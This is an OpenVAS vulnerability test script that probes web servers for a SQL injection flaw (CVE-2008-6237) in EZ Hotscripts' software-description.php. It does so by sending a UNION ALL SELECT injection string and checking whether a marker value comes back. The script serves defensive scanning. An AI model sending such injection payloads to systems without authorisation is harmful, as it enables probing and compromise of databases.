###############################################################################
# OpenVAS Vulnerability Test
# $Id: EZ_hotscripts_34024_sql_injection.nasl 4655 2016-12-01 15:18:13Z teissa $
#
# Scripts For Sites EZ Hotscripts 'software-description.php' SQL
# Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "EZ Hotscripts is prone to an SQL-injection vulnerability because it
  fails to sufficiently sanitize user-supplied data before using it in
  an SQL query.

  Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.";


if (description)
{
 script_id(100027);
 script_version("$Revision: 4655 $");
 script_tag(name:"last_modification", value:"$Date: 2016-12-01 16:18:13 +0100 (Thu, 01 Dec 2016) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_bugtraq_id(34024);
 script_cve_id("CVE-2008-6237");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("Scripts For Sites EZ Hotscripts 'software-description.php' SQL Injection Vulnerability");

 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
#if(!can_host_php(port:port))exit(0);

dir = make_list("/software", cgi_dirs());
foreach d (dir)
{ 
 url = string(d, "/software-description.php?id=-5%20union%20all%20select%201,2,1234567890987654321,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);

 if( buf == NULL )continue;

 if( egrep(pattern: "<input.*sid.*value.*-5 union all select 1,2,1234567890987654321,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27.*>",
	   string: buf) )
   {    
    security_message(port:port);
    exit(0);
   }
}
exit(0);
